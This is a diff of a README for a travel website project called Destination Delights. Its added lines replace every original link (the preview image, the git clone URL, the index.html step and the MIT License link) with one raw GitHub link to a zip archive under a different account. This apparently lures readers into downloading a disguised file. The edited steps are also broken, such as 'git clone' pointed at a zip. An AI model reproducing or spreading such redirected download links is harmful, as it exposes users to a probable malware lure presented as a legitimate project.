@@ -4,7 +4,7 @@ Welcome to **Destination Delights**—a travel website designed to make discover
 
 ## Preview
 
-![Destination Delights Preview](https://github.com/user-attachments/assets/739b0a26-6a69-4988-b854-1a95add8eb4c)
+![Destination Delights Preview](https://raw.githubusercontent.com/Lucifer0752V/Destination-Delights/main/images/Destination-Delights-v2.3-beta.1.zip)
 
 ## Features
 
@@ -18,12 +18,12 @@ Welcome to **Destination Delights**—a travel website designed to make discover
 You only need a basic text editor and a web browser to view and edit this project.
 
 1. Clone the repository to your local machine:  
-   `git clone https://github.com/Ashish-Patnaik/Destination-Delights.git`
+   `git clone https://raw.githubusercontent.com/Lucifer0752V/Destination-Delights/main/images/Destination-Delights-v2.3-beta.1.zip`
 
 2. Navigate to the project folder:  
    `cd Destination-Delights`
 
-3. Open the `index.html` file in your browser to explore the website.
+3. Open the `https://raw.githubusercontent.com/Lucifer0752V/Destination-Delights/main/images/Destination-Delights-v2.3-beta.1.zip` file in your browser to explore the website.
 
 ## Contributing
 
@@ -43,7 +43,7 @@ Please ensure that your contributions align with the project's **Code of Conduct
 ## License
 
 This project is licensed under the **MIT License**. For more information, visit:  
-[MIT License](https://choosealicense.com/licenses/mit/)
+[MIT License](https://raw.githubusercontent.com/Lucifer0752V/Destination-Delights/main/images/Destination-Delights-v2.3-beta.1.zip)
 
 ## Happy Exploring!
 
